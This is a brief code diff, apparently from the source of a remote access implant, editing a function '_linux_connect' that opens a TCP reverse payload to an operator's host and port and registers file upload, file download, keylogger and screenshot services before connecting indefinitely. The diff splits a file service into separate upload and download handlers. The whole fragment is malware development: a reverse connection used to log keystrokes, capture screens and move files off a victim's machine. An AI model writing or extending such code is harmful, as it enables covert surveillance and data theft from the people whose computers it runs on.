@@ -10,9 +10,11 @@ def _linux_connect(args):
     host, port = addr = args.host, args.port
 
     with payload.TCPReversePayload(addr) as p:
-        p.register_file_service()
+        p.register_file_upload()
+        p.register_file_download()
         p.register_keylogger()
         p.register_screenshot()
+
         p.connect_forever()
 
 
